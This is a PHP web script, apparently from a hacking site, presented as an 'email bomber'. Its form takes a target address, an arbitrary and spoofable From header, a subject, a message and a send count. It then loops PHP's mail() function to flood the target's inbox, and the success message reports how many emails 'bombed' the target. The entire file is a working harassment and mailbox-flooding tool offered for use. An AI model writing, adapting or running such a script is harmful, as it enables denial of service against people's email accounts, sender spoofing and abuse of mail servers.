<?php
/*
PHP Email Bomber 
=========================
   Masters-Hackers.info 
=========================
*/
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<title> PHP Email Bomber </title>
<meta name="Generator" content="PHP Email Bomber" />
<meta name="Description" content="A PHP Email Bomber Script Coded In PHP" />
<meta name="Keywords" content="php, email, bomber" />
</head>

<body>
<form method="post" action="">
<b>Email To Bomb:</b>
<input type="text" name="emailto" size="53"><br />
<b>Email From:</b>
<input type="text" name="emailfrom" size="53"><br />
<b>Subject:</b>
<input type="text" name="subject" size="53"><br />
<b>Message:</b><br />
<textarea name="message" rows="6" cols="40"></textarea>
<br /><br />

<b>Send <input type="text" name="sendamount" size="1" value="1"> Email(s).</b> <input type="submit" name="bombmail" value="Bomb Email!">
</form>

<?php
if (isset($_REQUEST['bombmail'])){
$emailto = $_POST['emailto'];
$emailfrom = "From: ".$_POST['emailfrom'];
$subject = $_POST['subject'];

$message = $_POST['message'];
$sendamount = $_POST['sendamount'];
$i = 0;
if ($emailto == ""){
echo "<br /><b>Error: You must enter an email to bomb!</b>";
} else if ($emailfrom == ""){
echo "<br /><b>Error: You must enter an email to send from!</b>";
} else if ($subject == ""){
echo "<br /><b>Error: You did not enter a subject for your message!</b>";
} else if ($message == ""){
echo "<br /><b>Error: You did not enter a message to send!</b>";
} else if ($sendamount == ""){
echo "<br /><b>Error: You did not enter a valid amount of emails to send!</b>";
} else {
do {
mail($emailto, $subject, $message, $emailfrom);
$i++;

}
while ($i<$sendamount);
echo "<br /><b>You have successfully bombed ".$emailto." with ".$i." emails!</b>";
}
}
?>
</body>
</html>
